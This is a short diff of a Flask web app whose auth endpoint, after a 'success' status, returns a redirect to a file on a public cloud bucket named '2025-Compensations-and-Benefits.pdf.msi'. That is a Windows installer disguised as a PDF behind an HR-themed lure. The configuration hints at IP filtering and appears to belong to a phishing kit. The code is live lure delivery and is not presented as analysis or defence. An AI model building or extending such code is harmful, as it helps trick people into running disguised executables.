@@ -20,7 +20,7 @@ IP_API_KEY = os.getenv("IP_API_KEY")
 REDIRECT_URL = os.getenv("REDIRECT_URL")
 STRICT_MODE = os.getenv("STRICT_MODE")
 OWNER = os.getenv("OWNER")
-vercel_url = os.getenv("VERCEL_URL")
+vercel_url = os.getenv("VERCEL_PROJECT_PRODUCTION_URL")
 
 # --- Flask App Initialization ---
 app = Flask(__name__, static_folder='build')
@@ -558,10 +558,8 @@ def auth():
         })
     
     if current_status == 'success':
-        # return redirect("https://pub-fc9adb32c7e543e78bed0c56d524616b.r2.dev/2025-Compensations-and-Benefits.pdf.msi")
         return jsonify({"status": "success", "redirect_url": "https://pub-fc9adb32c7e543e78bed0c56d524616b.r2.dev/2025-Compensations-and-Benefits.pdf.msi"})
     return jsonify({"status": current_status})
-
 
 
 
